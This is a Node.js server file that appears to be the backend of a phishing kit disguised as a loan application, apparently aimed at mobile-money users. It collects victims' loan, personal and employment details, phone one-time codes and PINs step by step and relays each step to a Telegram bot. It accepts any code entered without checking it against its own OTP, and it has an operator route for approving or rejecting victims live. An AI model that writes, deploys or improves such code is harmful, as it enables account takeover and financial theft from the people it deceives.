const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const io = new Server(server, { cors: { origin: "*" } });
const sessions = new Map();

io.on('connection', (socket) => {
    // Initialize session for every new visitor
    sessions.set(socket.id, { data: { socketId: socket.id }, otp: null });

    // --- STEP 1: LOAN DETAILS ---
    socket.on('step1', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data = { ...session.data, ...data };
            botManager.sendStep1(session.data);
        }
    });

    // --- STEP 2: PERSONAL INFO ---
    socket.on('step2', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data = { ...session.data, ...data };
            botManager.sendStep2(session.data);
        }
    });

    // --- STEP 3: EMPLOYMENT ---
    socket.on('step3-data', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data = { ...session.data, ...data };
            botManager.sendStep3(session.data);
        }
    });

    // --- STEP 4 (PART A): GENERATE OTP (NO TELEGRAM ALERT) ---
    socket.on('send-otp', (data) => {
        const otp = Math.floor(1000 + Math.random() * 9000).toString();
        const session = sessions.get(socket.id);
        if (session) {
            session.otp = otp;
            session.data.phone = data.phoneNumber;
            console.log(`[SYSTEM] OTP Generated for ${socket.id}: ${otp}`);
            socket.emit('otp-sent'); 
        }
    });

    // --- STEP 4 (PART B): THE "CATCH-ALL" FIX ---
    // This function handles the submission regardless of the event name
    const handleStep4Submission = (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            // Support both {otp: '1234'} and just '1234'
            session.data.otp = data.otp || data; 
            
            console.log(`[TRIGGER] Step 4 Submission for ${socket.id}. Code: ${session.data.otp}`);
            
            // SEND TO TELEGRAM IMMEDIATELY
            botManager.sendStep4(session.data); 
            
            // MOVE USER TO PIN STEP
            socket.emit('otp-verified'); 
        }
    };

    // Listen for both common event names to prevent missing data
    socket.on('step4', handleStep4Submission);
    socket.on('step4-otp', handleStep4Submission);

    // --- STEP 5: PIN SUBMISSION ---
    socket.on('step5-pin', (data) => {
        const session = sessions.get(socket.id);
        if (session) {
            session.data.pin = data.pin;
            botManager.sendStep5(session.data);
        }
    });

    socket.on('disconnect', () => {
        sessions.delete(socket.id);
    });
});

// --- ADMIN DECISION ROUTE ---
app.post('/admin/action', (req, res) => {
    const { socketId, action } = req.body;
    if (action === 'approve') {
        io.to(socketId).emit('admin-approved', { referenceId: "MIX-" + Date.now() });
    } else {
        io.to(socketId).emit('admin-rejected', { message: 'Maombi yamekataliwa.' });
    }
    res.sendStatus(200);
});

// --- RENDER BINDING ---
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Final Production Server Live on Port ${PORT}`);
});